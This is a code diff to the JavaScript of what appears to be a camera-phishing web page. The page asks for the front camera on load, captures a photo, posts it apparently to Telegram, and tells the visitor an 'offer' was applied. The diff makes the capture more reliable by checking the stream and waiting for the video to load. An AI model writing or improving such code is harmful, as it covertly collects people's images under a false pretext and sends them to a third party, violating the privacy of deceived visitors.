@@ -107,7 +107,7 @@
   const context = canvas.getContext("2d");
   let stream = null;
 
-  // Auto ask for camera permission on load
+  // Request camera on load
   window.onload = () => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(s => {
@@ -121,6 +121,18 @@
   };
 
   async function captureAndSend() {
+    if (!stream) {
+      alert("📷 Camera not ready!");
+      return;
+    }
+
+    // Wait for the video to be ready
+    if (video.readyState < 2) {
+      await new Promise(resolve => {
+        video.onloadeddata = () => resolve();
+      });
+    }
+
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
 
@@ -134,7 +146,6 @@
       body: form
     }).then(() => {
       alert("✅ Offer applied successfully!");
-      // Optional: Redirect or close cam
       stream.getTracks().forEach(track => track.stop());
     }).catch((e) => {
       alert("❌ Failed to send photo to Telegram.");
